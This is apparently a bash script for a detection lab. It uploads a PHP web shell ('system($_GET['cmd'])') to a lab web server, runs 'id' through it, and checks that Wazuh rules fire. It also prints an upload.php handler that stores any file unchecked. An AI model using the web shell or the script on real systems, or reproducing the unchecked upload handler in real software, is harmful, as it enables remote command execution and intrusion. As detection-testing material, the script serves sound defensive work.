#!/bin/bash
# Web Shell Upload Attack Simulation
# Target: Ubuntu Agent (10.10.10.20) - requires web server with upload endpoint
# Expected Wazuh Rules: 100003 (custom), 31151 (built-in)
# MITRE: T1505.003 (Web Shell)

set -e

TARGET="10.10.10.20"
UPLOAD_ENDPOINT="/upload.php"
SHELL_CONTENT='<?php system($_GET["cmd"]); ?>'
SHELL_FILENAME="shell.php"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] Web Shell Upload Attack Simulation${NC}"
echo -e "${YELLOW}[*] Target: http://${TARGET}${UPLOAD_ENDPOINT}${NC}"
echo ""

# Check if target is reachable
if ! ping -c 1 -W 2 "$TARGET" > /dev/null 2>&1; then
    echo -e "${RED}[!] Target $TARGET is not reachable${NC}"
    exit 1
fi

# Check if web server is running
if ! curl -s -o /dev/null -w "%{http_code}" "http://$TARGET" | grep -q "200\|301\|302"; then
    echo -e "${RED}[!] Web server not responding on $TARGET${NC}"
    echo -e "${YELLOW}[*] Make sure nginx/apache is running on Ubuntu Agent${NC}"
    exit 1
fi

# Create test shell file
echo "$SHELL_CONTENT" > "/tmp/$SHELL_FILENAME"
echo -e "${GREEN}[*] Created test shell: /tmp/$SHELL_FILENAME${NC}"

# Test upload endpoint exists
UPLOAD_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$UPLOAD_ENDPOINT" -X GET)
if [[ "$UPLOAD_STATUS" != "200" && "$UPLOAD_STATUS" != "405" ]]; then
    echo -e "${RED}[!] Upload endpoint not found (HTTP $UPLOAD_STATUS)${NC}"
    echo -e "${YELLOW}[*] Create upload.php on Ubuntu Agent:${NC}"
    echo -e "    sudo mkdir -p /var/www/html/uploads"
    echo -e "    sudo chown www-data:www-data /var/www/html/uploads"
    echo -e "    cat > /var/www/html/upload.php << 'EOF'"
    echo -e "<?php"
    echo -e "if (isset(\$_FILES['file'])) {"
    echo -e "    move_uploaded_file(\$_FILES['file']['tmp_name'], '/var/www/html/uploads/' . \$_FILES['file']['name']);"
    echo -e "    echo \"Uploaded\";"
    echo -e "}"
    echo -e "EOF"
    exit 1
fi

echo -e "${GREEN}[*] Uploading shell...${NC}"
echo -e "${YELLOW}[*] This will trigger Wazuh rules: 100003, 31151${NC}"
echo ""

# Upload shell
RESPONSE=$(curl -s -F "file=@/tmp/$SHELL_FILENAME" "http://$TARGET$UPLOAD_ENDPOINT")
echo -e "${GREEN}[*] Upload response: $RESPONSE${NC}"

# Test shell execution
echo -e "${GREEN}[*] Testing shell execution...${NC}"
SHELL_TEST=$(curl -s "http://$TARGET/uploads/$SHELL_FILENAME?cmd=id")
echo -e "${GREEN}[*] Shell test output: $SHELL_TEST${NC}"

# Cleanup
rm -f "/tmp/$SHELL_FILENAME"

echo ""
echo -e "${GREEN}[*] Check Wazuh Dashboard for alerts:${NC}"
echo -e "    https://10.10.10.12:5601"
echo -e "    Filter: rule.id: 100003 OR 31151"
echo -e "    MITRE: T1505.003"